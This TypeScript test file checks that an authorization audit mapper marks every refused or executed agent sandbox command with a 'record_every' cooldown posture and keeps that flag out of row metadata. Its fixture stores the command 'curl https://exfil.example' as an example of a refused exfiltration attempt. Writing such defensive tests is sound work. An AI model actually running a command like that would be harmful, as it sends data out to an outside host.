/**
 * The producer half of cinatra#2266 AC1 — the denied-cooldown POSTURE this
 * mapper declares to the authz kernel.
 *
 * `toAuthzAuditEventInput` pins `resourceType` / `operation` to constants and
 * the actor to the user, so the kernel's default cooldown key
 * (`actor : resourceType : operation`) is ONE string for every refusal a user
 * ever receives. Under that key the kernel kept the first refusal in each 60 s
 * window and discarded the rest — different jobs, commands and reasons alike.
 *
 * This producer answers with `record_every` rather than a finer key, because
 * the refusal paths that matter carry nothing that would make a finer key work
 * (a rejected voucher's claims, including its command id, are never trusted).
 * These pin that posture, and pin that it is CONTROL — it must not leak into
 * the row the metadata-only contract governs.
 */
import { describe, expect, it } from "vitest";

import { toAuthzAuditEventInput } from "../broker";
import { DEFAULT_SANDBOX_LIMITS, type ExecutionAuditRecord } from "../types";

const REFUSAL: ExecutionAuditRecord = {
  jobId: "job-1",
  orgId: "org-1",
  userId: "user-1",
  surface: "agent_run",
  command: "curl https://exfil.example",
  cwd: "/workspace",
  decision: "refused",
  reason: "voucher_invalid",
  effectivePolicy: { egressMode: "allowlist", limits: DEFAULT_SANDBOX_LIMITS },
  atMs: 1_700_000_000_000,
};

describe("toAuthzAuditEventInput — denied-cooldown posture", () => {
  it("declares that every refusal is recorded, whatever it carries", () => {
    // Including the ones with no command identity at all — a forged voucher is
    // refused before its claims are trusted, which is why a finer key cannot
    // separate two of them.
    const forged: ExecutionAuditRecord = {
      ...REFUSAL,
      voucherRejection: "signature_invalid",
      commandId: undefined,
    };
    expect(toAuthzAuditEventInput(forged).deniedCooldown).toBe("record_every");
    expect(
      toAuthzAuditEventInput({ ...REFUSAL, reason: "run_removed" }).deniedCooldown,
    ).toBe("record_every");
    expect(
      toAuthzAuditEventInput({ ...REFUSAL, commandId: "cmd-1" }).deniedCooldown,
    ).toBe("record_every");
  });

  it("declares it on executed records too — the field is uniform, not conditional", () => {
    // Allowed rows are never suppressed, so the kernel ignores it; a mapper
    // that set it only sometimes would be a branch with no reader.
    const executed: ExecutionAuditRecord = {
      ...REFUSAL,
      decision: "executed",
      reason: undefined,
      exitCode: 0,
    };
    const mapped = toAuthzAuditEventInput(executed);
    expect(mapped.decision).toBe("allowed");
    expect(mapped.deniedCooldown).toBe("record_every");
  });

  it("is cooldown CONTROL only — it never becomes row metadata", () => {
    const mapped = toAuthzAuditEventInput({ ...REFUSAL, commandId: "cmd-1" });
    expect(mapped.metadata).not.toHaveProperty("deniedCooldown");
  });
});
